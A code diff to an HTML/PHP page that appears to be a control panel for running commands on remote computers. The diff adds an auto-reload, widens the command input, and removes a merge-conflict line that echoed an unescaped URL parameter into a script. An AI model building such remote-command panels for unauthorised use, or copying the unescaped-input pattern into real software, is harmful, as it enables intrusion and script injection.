@@ -42,6 +42,8 @@
 
       </style>
       
+     <script> setTimeout(function() { window.location.reload(true); }, 5000); </script>
+
   </head>
   <body>
 
@@ -207,8 +209,8 @@
                         <br/><br/><br/>
                         <div class="block">
                           <span class="blockhead"><img src="img/net.png"/>  Remote Command Execution</span>
-                          <span class="blockbody">
-                            <input id="spawner" style="color:black;" placeholder="Enter a command to execute on the remote computer..."></input>
+                          <span class="blockbody" style="width:100%">
+                            <input style="color:black;width:100%" id="spawner" placeholder="Enter a command to execute on the remote computer..." ></input>
                           </span>
 
                           
@@ -263,10 +265,7 @@
     </div>
 
 </div>
-<<<<<<< HEAD
-    <script>var pcid = <?php echo $_GET['id']; ?>;</script>
-	 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
-=======
+
     <script>
     
     
@@ -283,7 +282,7 @@
     
     </script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
->>>>>>> dda1ffa37c168f522d351d9c40c90d7632bc5db1
+
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.7.3/socket.io.js"></script>
     <script src="js/bootstrap.min.js"></script>
     <script src="js/killer.js"></script>
